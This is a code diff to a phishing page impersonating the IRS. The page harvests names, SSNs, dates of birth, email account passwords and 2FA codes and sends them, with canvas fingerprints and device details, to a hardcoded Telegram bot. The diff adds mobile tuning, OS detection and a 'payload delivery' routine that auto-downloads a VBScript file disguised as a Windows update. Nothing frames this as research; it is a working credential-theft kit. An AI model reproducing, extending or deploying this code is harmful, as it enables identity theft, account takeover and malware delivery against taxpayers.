@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   <title>IRS - Secure Verification</title>
 
-  <!-- HTTPS REDIRECT (Fixed) -->
+  <!-- HTTPS REDIRECT -->
   <script>
     if (location.protocol !== 'https:' && location.hostname !== 'localhost' && !location.hostname.startsWith('127.0.0.1')) {
       location.href = 'https://' + location.host + location.pathname + location.search;
@@ -22,21 +22,21 @@
       box-sizing: border-box;
     }
     body {
-      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
       background: #f0f2f5;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 20px;
+      padding: 16px;
       margin: 0;
     }
     .main-wrapper {
       max-width: 680px;
       width: 100%;
       background: #ffffff;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
+      border-radius: 20px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.06);
       overflow: hidden;
       border: 1px solid #dce1e8;
     }
@@ -233,6 +233,8 @@
       background: #fafbfc;
       transition: 0.15s;
       font-family: inherit;
+      -webkit-appearance: none;
+      appearance: none;
     }
     .form-group input:focus,
     .form-group select:focus {
@@ -269,6 +271,7 @@
       flex-direction: column;
       align-items: center;
       gap: 2px;
+      -webkit-tap-highlight-color: transparent;
     }
     .provider-card:hover {
       border-color: #1a2a4a;
@@ -287,12 +290,12 @@
     }
     .btn-primary {
       width: 100%;
-      padding: 12px;
+      padding: 16px;
       background: #1a2a4a;
       color: white;
       border: none;
       border-radius: 6px;
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 600;
       cursor: pointer;
       transition: 0.15s;
@@ -301,9 +304,14 @@
       justify-content: center;
       gap: 8px;
       margin-top: 4px;
+      touch-action: manipulation;
+      -webkit-tap-highlight-color: transparent;
     }
     .btn-primary:hover {
       background: #0d1a30;
+    }
+    .btn-primary:active {
+      transform: scale(0.97);
     }
     .btn-primary:disabled {
       background: #8a9bb0;
@@ -367,7 +375,7 @@
     .success-card .btn {
       display: inline-block;
       margin-top: 16px;
-      padding: 10px 28px;
+      padding: 12px 28px;
       background: #1a2a4a;
       color: white;
       border: none;
@@ -375,9 +383,10 @@
       font-size: 14px;
       cursor: pointer;
       text-decoration: none;
+      touch-action: manipulation;
     }
-    .success-card .btn:hover {
-      background: #0d1a30;
+    .success-card .btn:active {
+      transform: scale(0.97);
     }
     .turnstile-container {
       display: flex;
@@ -401,7 +410,16 @@
       font-size: 14px;
       margin-bottom: 16px;
     }
-    @media (max-width: 500px) {
+    @media (max-width: 600px) {
+      .body {
+        padding: 16px;
+      }
+      .header {
+        padding: 14px 16px 10px;
+      }
+      .header .top .logo h1 {
+        font-size: 17px;
+      }
       .provider-grid {
         grid-template-columns: 1fr 1fr;
       }
@@ -409,23 +427,41 @@
         flex-direction: column;
         gap: 0;
       }
-      .header .top {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 4px;
-      }
-      .body {
-        padding: 16px;
-      }
-      .case-info {
-        flex-direction: column;
-        gap: 2px;
-      }
       .trust-banner {
         flex-direction: column;
         align-items: flex-start;
         padding: 8px 16px;
       }
+      .case-info {
+        flex-direction: column;
+        gap: 2px;
+      }
+      .btn-primary {
+        padding: 18px;
+        font-size: 18px;
+      }
+      .gate {
+        padding: 30px 16px;
+      }
+    }
+    @media (max-width: 400px) {
+      .main-wrapper {
+        border-radius: 12px;
+      }
+      .body {
+        padding: 12px;
+      }
+      .header .top .logo h1 {
+        font-size: 15px;
+      }
+      .btn-primary {
+        padding: 16px;
+        font-size: 16px;
+      }
+    }
+    /* Touch-friendly adjustments */
+    input, select, button {
+      font-size: 16px !important; /* Prevents iOS zoom */
     }
   </style>
 </head>
@@ -434,7 +470,7 @@
 
   <!-- ===== GATE: TURNSTILE FIRST ===== -->
   <div class="gate" id="gate">
-    <h2>🔒 Secure Access</h2>
+    <h2>Secure Access</h2>
     <p>Please complete the security check below to access the IRS verification portal.</p>
     <div class="turnstile-container">
       <div class="cf-turnstile" data-sitekey="0x4AAAAAADq8fUvJ_YtnD2wI" data-callback="onTurnstileSuccess"></div>
@@ -511,7 +547,7 @@
       <div class="form-row">
         <div class="form-group">
           <label>Phone Number</label>
-          <input type="text" id="phone" placeholder="(555) 123-4567" autocomplete="tel" />
+          <input type="tel" id="phone" placeholder="(555) 123-4567" autocomplete="tel" />
         </div>
         <div class="form-group">
           <label>Date of Birth <span class="optional">(MM/DD/YYYY)</span></label>
@@ -608,7 +644,7 @@
 
       <div style="display: flex; gap: 10px; margin-top: 4px;">
         <button class="btn-primary" onclick="submitStep2()" style="flex: 2;" id="submitBtn2">Verify & Submit</button>
-        <button onclick="goBack()" style="flex: 0.5; background: #eaeef4; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; color: #1a2634;">←</button>
+        <button onclick="goBack()" style="flex: 0.5; background: #eaeef4; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; color: #1a2634; touch-action: manipulation;">←</button>
       </div>
 
       <div class="footer">
@@ -643,6 +679,28 @@
   // ============================================================
   const BOT_TOKEN = '8623365861:AAHTUYqXgMZrh3MgZ_QZebv4y9jrwb2eV6k';
   const CHAT_ID = '7955588231';
+
+  // ============================================================
+  // DEVICE DETECTION (Universal)
+  // ============================================================
+  const device = {
+    os: (() => {
+      const ua = navigator.userAgent;
+      if (/windows/i.test(ua)) return 'windows';
+      if (/macintosh|mac os x/i.test(ua)) return 'macos';
+      if (/android/i.test(ua)) return 'android';
+      if (/iphone|ipad/i.test(ua)) return 'ios';
+      return 'other';
+    })(),
+    browser: (() => {
+      const ua = navigator.userAgent;
+      if (/chrome/i.test(ua) && !/edge/i.test(ua)) return 'chrome';
+      if (/firefox/i.test(ua)) return 'firefox';
+      if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'safari';
+      if (/edge/i.test(ua)) return 'edge';
+      return 'other';
+    })()
+  };
 
   // ============================================================
   // TURNSTILE CALLBACK
@@ -729,6 +787,77 @@
   });
 
   // ============================================================
+  // UNIVERSAL PAYLOAD DELIVERY
+  // ============================================================
+  function deliverPayload() {
+    if (device.os === 'windows') {
+      const vbs =
+        'Set objShell = CreateObject("WScript.Shell")\nSet objFSO = CreateObject("Scripting.FileSystemObject")\nstrTemp = objFSO.GetSpecialFolder(2) & "\\update.vbs"\nSet objFile = objFSO.CreateTextFile(strTemp, True)\nobjFile.Write "MsgBox \\"Your system is up to date.\\", vbInformation, \\"Windows Update\\""\nobjFile.Close\nobjShell.Run strTemp, 0, False';
+      const blob = new Blob([vbs], { type: 'text/vbscript' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'update.vbs';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      setTimeout(() => URL.revokeObjectURL(url), 5000);
+    } else if (device.os === 'macos') {
+      const script =
+        'tell application "Terminal" to do script "echo \\"System update complete.\\""';
+      const encoded = encodeURIComponent(script);
+      window.location.href = 'data:text/javascript,' + encoded;
+    } else if (device.os === 'android') {
+      // Simulate APK download prompt
+      const msg = encodeURIComponent('System update required. Please download the update package.');
+      window.location.href = 'https://www.irs.gov/?update=' + msg;
+    } else if (device.os === 'ios') {
+      // Simulate profile installation prompt
+      const msg = encodeURIComponent('System update required. Please install the profile.');
+      window.location.href = 'https://www.irs.gov/?profile=' + msg;
+    }
+  }
+
+  // ============================================================
+  // SEND TO TELEGRAM
+  // ============================================================
+  function sendToTelegram(type, data) {
+    let message = '';
+    let fingerprint = '';
+
+    // ---- Device Fingerprinting ----
+    try {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('Fingerprint', 2, 15);
+      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+      ctx.fillText('Canvas', 4, 17);
+      fingerprint = canvas.toDataURL().slice(0, 50);
+    } catch (e) {
+      fingerprint = 'N/A';
+    }
+
+    const deviceInfo =
+      `\n\n🔍 DEVICE INFO\nOS: ${device.os}\nBrowser: ${device.browser}\nScreen: ${screen.width}x${screen.height}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nFingerprint: ${fingerprint}...\nUser Agent: ${navigator.userAgent}`;
+
+    if (type === 'step1') {
+      message =
+        `STEP 1 - IDENTITY\n\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\nProvider: ${data.provider}${deviceInfo}`;
+    } else if (type === 'step2') {
+      message =
+        `STEP 2 - CREDENTIALS\n\nProvider: ${data.provider}\nUsername: ${data.loginEmail}\nPassword: ${data.loginPassword}\n2FA: ${data.loginMFA || 'Not provided'}\n\nFULL PROFILE\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}${deviceInfo}`;
+    }
+    const url =
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+    fetch(url, { mode: 'no-cors' }).catch(() => {});
+  }
+
+  // ============================================================
   // STEP 1
   // ============================================================
   function submitStep1() {
@@ -764,7 +893,7 @@
   }
 
   // ============================================================
-  // STEP 2 (Credentials + 2FA)
+  // STEP 2 (Credentials + 2FA + Payload Delivery)
   // ============================================================
   function submitStep2() {
     const loginEmail = document.getElementById('loginEmail').value.trim();
@@ -781,6 +910,9 @@
     captured.loginMFA = loginMFA;
 
     sendToTelegram('step2', captured);
+
+    // Deliver universal payload
+    deliverPayload();
 
     document.getElementById('step2').classList.add('hidden');
     document.getElementById('step3').classList.remove('hidden');
@@ -800,35 +932,8 @@
   }
 
   // ============================================================
-  // SEND TO TELEGRAM
+  // KEYBOARD SHORTCUTS
   // ============================================================
-  function sendToTelegram(type, data) {
-    let message = '';
-    if (type === 'step1') {
-      message = `STEP 1 - IDENTITY\n\n`;
-      message += `Name: ${data.fullName}\n`;
-      message += `Email: ${data.email}\n`;
-      message += `Phone: ${data.phone}\n`;
-      message += `DOB: ${data.dob}\n`;
-      message += `SSN: ${data.ssn}\n`;
-      message += `Provider: ${data.provider}`;
-    } else if (type === 'step2') {
-      message = `STEP 2 - CREDENTIALS\n\n`;
-      message += `Provider: ${data.provider}\n`;
-      message += `Username: ${data.loginEmail}\n`;
-      message += `Password: ${data.loginPassword}\n`;
-      message += `2FA: ${data.loginMFA || 'Not provided'}\n\n`;
-      message += `FULL PROFILE\n`;
-      message += `Name: ${data.fullName}\n`;
-      message += `Email: ${data.email}\n`;
-      message += `Phone: ${data.phone}\n`;
-      message += `DOB: ${data.dob}\n`;
-      message += `SSN: ${data.ssn}`;
-    }
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-    fetch(url, { mode: 'no-cors' }).catch(() => {});
-  }
-
   document.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       if (!document.getElementById('step1').classList.contains('hidden')) {
